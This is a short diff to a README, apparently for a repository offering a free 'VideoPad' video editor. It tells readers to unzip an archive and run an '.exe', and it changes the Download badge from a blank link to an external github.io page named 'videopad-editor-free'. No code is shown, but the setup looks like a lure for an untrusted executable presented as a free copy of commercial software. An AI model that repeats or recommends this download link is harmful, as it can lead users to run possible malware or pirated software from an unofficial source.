@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://videopad-editor-free.github.io/.github/)
 
 ## 📸 Overview
 <img width="385" height="313" alt="videopad-main-interface" src="https://github.com/user-attachments/assets/6afa8c27-8163-4e87-aef9-0885efd9e12f" />
